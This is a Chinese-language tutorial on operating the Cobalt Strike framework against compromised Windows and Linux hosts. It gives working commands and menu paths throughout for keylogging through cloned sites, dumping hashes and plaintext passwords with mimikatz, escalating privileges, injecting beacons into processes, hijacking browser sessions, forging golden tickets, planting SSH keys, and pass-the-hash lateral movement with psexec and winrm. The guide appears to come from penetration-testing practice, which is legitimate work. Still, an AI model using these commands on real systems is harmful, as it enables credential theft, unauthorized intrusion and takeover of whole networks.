### 克隆网站
该模块用来克隆一个网站，来获取用户的键盘记录
然后访问URL
cs的web日志可以查看到目标访问的键盘记录
###
### 信息搜集
该模块用来获取用户的系统信息、浏览器信息。
然后只要目标访问我们的这个链接，就会自动跳转到百度，并且我们的cs可以获取到目标系统和浏览器的信息
## 视图View
点击中间的View
· Applications 显示受害者机器的应用信息；
· Credentials 显示受害者机器的凭证信息，通过hashdump和mimikatz获取的密码都保存在这里；
· Downloads 查看从被控机器上下载的文件；
· Event Log 可以看到事件日志，清楚的看到系统的事件,并且团队可以在这里聊天;
· Keystrokes 查看键盘记录；
· Proxy Pivots 查看代理信息；
· Screenshots 查看屏幕截图；
· Script Console 在这里可以加载各种脚本以增强功能，脚本地址：
· Targets 查看目标；
· Web Log 查看web日志。
## 对被控主机的操作
    Interact       打开beacon
    Access 
        dump hashes   获取hash
        Elevate       提权
        Golden Ticket 生成黄金票据注入当前会话
        MAke token    凭证转换
        Run Mimikatz  运行 Mimikatz 
        Spawn As      用其他用户生成Cobalt Strike的beacon
    Explore
        Browser Pivot 劫持目标浏览器进程
        Desktop(VNC)  桌面交互
        File Browser  文件浏览器
        Net View      命令Net View
        Port scan     端口扫描
        Process list  进程列表
        Screenshot    截图
    Pivoting
        SOCKS Server 代理服务
        Listener     反向端口转发
        Deploy VPN   部署VPN
    Spawn            新的通讯模式并生成会话
    Session          会话管理，删除，心跳时间，退出，备注
## 抓取hash和dump明文密码
这两项功能都需要管理员权限，如果权限不足，先提权
· 抓取密码哈希：右键被控主机——>Access——>Dump Hashes
· 利用mimikatz抓取明文密码：右键被控主机——>Access——>Run Mimikatz
抓取密码哈希，也可以直接输入： **hashdump**
使用mimikatz抓取明文密码，也可以直接输入： **logonpasswords**
抓取完之后，点击凭证信息，就会显示我们抓取过的哈希或者明文。这里我们也可以手动添加或修改凭证信息
## 提权(Elevate)
当获取的当前权限不够时，可以使用提权功能
右键被控主机——>Access——>Elevate
亲测Windows Server 2008R2 、Win7 及以下系统可用。Win10不可用
默认有三个提权payload可以使用，分别是MS14-058、uac-dll、uac-token-duplication 。
我们选中MS14-058，点击Launch
之后就弹回来一个system权限的beacon
我们也可以自己加入一些提权脚本进去。在Github上有一个提权工具包，使用这个提权工具包可以增加几种提权方法：
。我们下载好该提权工具包后
如下，
再打开我们的提权，可以看到多了几种提权方式了
### 利用被控主机建立Socks4代理
当我们控制的主机是一台位于公网和内网边界的服务器 ，我们想利用该主机继续对内网进行渗透，于是，我们可以利用CS建立socks4A代理
右键被控主机——>Pivoting——>SOCKS Server
这里是SOCKS代理运行的端口，任意输入一个未占用的端口即可，默认CS会给出一个，我们直接点击Launch即可。
于是，我们在自己的主机上设置Socks4代理。代理ip是我们CS服务端的ip，端口即是 38588。
如果我们想查看整个CS代理的设置，可以点击View——>Proxy Pivots
然后我们可以直接在浏览器设置socks4代理
或者可以点击Tunnel，然后会给我们一个MSF的代理：setg Proxies socks4:xx.xx.xx.xx:38588
### 进程列表(注入进程，键盘监控)
右键被控主机——>Explore——>Process List
即可列出进程列表
选中该进程，Kill为杀死该进程，Refresh为刷新该进程，Inject 则是把beacon注入进程，Log
Keystrokes为键盘记录，Screenshot 为截图，Stea Token为窃取运行指定程序的用户令牌
这里着重讲一下注入进程和键盘记录
**Inject注入进程**
选择进程，点击Inject，随后选择监听器，点击choose，即可发现CobaltStrike弹回了目标机的一个新会话，这个会话就是成功注入到某进程的beacon会话。该功能可以把你的beacon会话注入到另外一个程序之中，注入之后，除非那个正常进程被杀死了，否则我们就一直可以控制该主机了。
    inject  进程PID  进程位数  监听
**键盘记录**
任意选择一个进程，点击 **Log Keystrokes** ，即可监听该主机的键盘记录
    keylogger  进程PID  进程位数
查看键盘记录结果：点击钥匙一样的按钮，就可以在底下看到键盘记录的详细了，会监听所有的键盘记录，而不只是选中的进程的键盘记录
键盘监听记录，也可以直接输入 **keylogger**
### 浏览器代理Browser Pivot
使用浏览器代理功能，我们可以注入到目标机器的浏览器进程中。然后在本地浏览器中设置该代理，这样，我们可以在本地浏览器上访问目标机器浏览器已经登录的网站，而不需要登录。但是目前浏览器代理只支持IE浏览器。如下，目标主机的IE浏览器目前在访问fofa，并且已登录。现在我们想利用浏览器代理在本地利用目标主机身份进行访问。
选中目标，邮件浏览器代理，然后选中IE浏览器的进程
这里看到IE浏览器有两个进程，分别是 6436和6544，我们随便选中一个即可。我这里选择 6544进程，然后下面会有一个默认的代理服务端口。点击开始
可以看到命令行如下：browserpivot 6544 x86
然后视图代理信息可以看到刚刚建立的浏览器代理。这里的意思是，TeamServer监听59398和26193端口。流程是这样，我们将流量给59398端口，59398端口将流量给26193端口，26193将流量给目标主机的26193端口。
我们这里代理设置TeamServer服务器的ip和59398端口即可。
访问Fofa，可以看到以目标身份登录了网站。
### 生成黄金票据注入当前会话(Golden Ticket)
生成黄金票据的前提是我们已经获得了krbtgt用户的哈希：9ce0b40ed1caac7523a22d574b32deb2
。并且已经获得一个以域用户登录的主机权限
右键当前获得的主机——>Access——>Golden Ticket
在弹出来的对话框中输入以下：
· User：要伪造用户名，这里我们一般填administrator
· Domain：域名
· Domain SID：域SID
· Krbtgt Hash：krbtgt用户的哈希
然后点击Build即可
这是输入框自动执行的mimikatz命令，如图票据传递攻击成功。我们查看域控的C盘，输入如下命令
    shell  dir\\win2008.xie.com\c$
### 凭证转换(Make Token)
如果我们已经获得了域内其他用户的账号密码，就可以使用此模块生成令牌，此时生成的令牌具有指定用户的身份。
右键当前获得的主机——>Access——>Make Token
输入已经获得了域用户的账号密码和域名，点击Build
日志框内的记录
### 端口扫描
右键——>目标——>端口扫描，然后填入要扫描的端口和网段。这里我们也可以直接执行命令：
    portscan 192.168.10.1-192.168.10.10 22,445 arp  1024
    portscan 192.168.10.1-192.168.10.10 22,445 icmp 1024
    portscan 192.168.10.1-192.168.10.10 22,445 none 1024
    ​
    一般我们直接运行命令
    portscan 192.168.1.0/24 22,445,1433,3306
扫完了之后，直接在控制台就会有结果。
我们点击视图——>目标，就会出现网段中存活的主机。(这是通过端口扫描探测到的结果显示的，要想这里显示，必须得先进行扫描端口)
### 哈希传递攻击或SSH远程登录
进行了上一步的端口扫描后，我们这里视图——>目标就会有当前网段的存活主机。
**对于Linux机器，如果我们知道账号密码的话，可以远程SSH连接，并返回一个CS的session。**
需要一台服务器作为中继才可以控制Linux服务器，我们这里先获取到一个windows服务器的权限，然后进入windows服务器的beacon进行执行命令
可以两种方式远程连接：ssh 和 ssh-key
可以图形化操作，也可以命令行操作：ssh 192.168.10.13:22 root root
**对于Linux机器，也可以使用SSH公私钥进行登录，并返回一个CS的session。**
需要一台服务器作为中继才可以控制Linux服务器，我们这里先获取到一个windows服务器的权限，然后进入windows服务器的beacon进行执行命令
首先，将公钥authorized_keys放到目标主机的/root/.ssh/目录下
然后我们本地机器放私钥，远程连接
    ssh-key 192.168.10.13:22 root e:\id_rsa
**对于Windows机器，如果我们获取到账号和密码(明文或者哈希)，都可以进行远程连接**
远程连接的前提是目标机器开放了445端口，然后CS会通过远程连接开启一个CS的seesion。可以用以下方式远程连接：psexec
、psexec64、psexec_psh 、winrm 和 winrm64。实测使用 psexec_psh 成功率最高。
已经得到机器Win2008的密码为：root
（329153f560eb329c0e1deea55e88a1e9），现在想哈希传递Win2003机器。监听器为：test
    如果知道知道密码哈希的话：
    ​
    rev2self
    pth WIN2008\Administrator 329153f560eb329c0e1deea55e88a1e9
    ​
    psexec的命令：jump psexec WIN2003 test
    psexec64的命令jump psexec64 WIN2003 test
    psexec_psh的命令：jump psexec_psh WIN2003 test
    winrm的命令：jump winrm WIN2003 test
    winrm64的命令： jump winrm64 WIN2003 test
    ​
    如果是知道明文密码的话：
    ​
    rev2self
    make_token WIN2008\Administrator root
    ​
    psexec的命令：jump psexec WIN2003 test
    psexec64的命令jump psexec64 WIN2003 test